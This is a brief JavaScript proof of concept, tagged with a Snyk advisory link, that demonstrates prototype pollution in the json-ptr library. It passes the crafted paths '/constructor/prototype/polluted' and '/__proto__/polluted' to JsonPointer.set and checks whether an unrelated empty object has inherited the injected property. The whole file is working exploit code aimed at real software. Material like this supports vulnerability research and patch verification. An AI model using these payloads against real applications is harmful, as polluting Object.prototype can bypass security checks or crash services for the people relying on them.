//https://snyk.io/vuln/SNYK-JS-JSONPTR-1016939
const { JsonPointer } = require("json-ptr");

let obj = {};
console.log("Before : " + obj.polluted); 
JsonPointer.set({}, '/constructor/prototype/polluted', "yes", true); 
JsonPointer.set({}, '/proto/polluted', "yes", true); 
console.log("After : " + obj.polluted);

